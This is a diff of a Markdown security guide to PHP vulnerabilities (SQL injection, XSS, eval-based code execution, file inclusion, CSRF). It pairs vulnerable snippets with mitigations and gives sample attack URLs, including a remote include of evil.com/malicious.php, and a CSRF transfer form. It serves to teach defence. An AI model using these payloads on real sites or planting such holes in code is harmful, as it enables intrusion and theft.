@@ -16,69 +16,69 @@ PHP (Hypertext Preprocessor) is a popular server-side scripting language widely 
 ### 1. **SQL Injection**
    - **Description:** Occurs when user input is improperly sanitized and directly incorporated into SQL queries, allowing attackers to execute arbitrary SQL commands.
    - **Exploitation:**
-     ```php
+```php
      <?php
      $username = $_GET['username'];
      $query = "SELECT * FROM users WHERE username = '$username'";
      ?>
-     ```
+```
    - **Exploitation Vector:** An attacker can manipulate the `$username` parameter to inject SQL code:
-     ```
-     http://example.com/login.php?username=admin' OR '1'='1
-     ```
+```
+http://example.com/login.php?username=admin' OR '1'='1
+```
    - **Mitigation:** Use prepared statements with bound parameters.
-     ```php
+```php
      <?php
      $stmt = $pdo->prepare("SELECT * FROM users WHERE username = ?");
      $stmt->execute([$username]);
      ?>
-     ```
+```
 
 ### 2. **Cross-Site Scripting (XSS)**
    - **Description:** Occurs when user input is improperly sanitized and then rendered in a web page, allowing attackers to inject malicious scripts.
    - **Exploitation:**
-     ```php
+```php
      <?php
      echo "Hello, " . $_GET['name'];
      ?>
-     ```
+```
    - **Exploitation Vector:** An attacker can inject a script via the `name` parameter:
-     ```
-     http://example.com/greet.php?name=<script>alert('XSS')</script>
-     ```
+```
+http://example.com/greet.php?name=<script>alert('XSS')</script>
+```
    - **Mitigation:** Use `htmlspecialchars()` to escape output.
-     ```php
+```php
      <?php
      echo "Hello, " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8');
      ?>
-     ```
+```
 
 ### 3. **Remote Code Execution (RCE)**
    - **Description:** Occurs when user input is directly executed as code, allowing attackers to run arbitrary commands on the server.
    - **Exploitation:**
-     ```php
+```php
      <?php
      eval($_GET['code']);
      ?>
-     ```
+```
    - **Exploitation Vector:** An attacker can execute arbitrary PHP code:
-     ```
-     http://example.com/exec.php?code=phpinfo();
-     ```
+```
+http://example.com/exec.php?code=phpinfo();
+```
    - **Mitigation:** Avoid using `eval()` with user input. Use strict input validation and sanitization.
 
 ### 4. **File Inclusion**
    - **Description:** Includes local or remote files based on user input, allowing attackers to execute malicious scripts.
    - **Exploitation:**
-     ```php
+```php
      <?php
      include($_GET['page']);
      ?>
-     ```
+```
    - **Exploitation Vector:** An attacker can include arbitrary files:
-     ```
-     http://example.com/index.php?page=http://evil.com/malicious.php
-     ```
+```
+http://example.com/index.php?page=http://evil.com/malicious.php
+```
    - **Mitigation:** Use `basename()` to sanitize filenames and avoid including files from user input. Disable `allow_url_include` in `php.ini`.
 
 ### 5. **File Upload Vulnerabilities**
@@ -89,13 +89,13 @@ PHP (Hypertext Preprocessor) is a popular server-side scripting language widely 
 ### 6. **Cross-Site Request Forgery (CSRF)**
    - **Description:** Forces a user to execute unwanted actions on a web application in which they are authenticated.
    - **Exploitation Vector:** Sending a malicious link or form to a user:
-     ```html
+```html
      <form action="http://example.com/transfer.php" method="POST">
          <input type="hidden" name="amount" value="1000">
          <input type="hidden" name="to_account" value="attacker_account">
          <input type="submit">
      </form>
-     ```
+```
    - **Mitigation:** Use CSRF tokens in forms and validate them on the server side.
 
 ## Tools for Exploiting PHP Applications
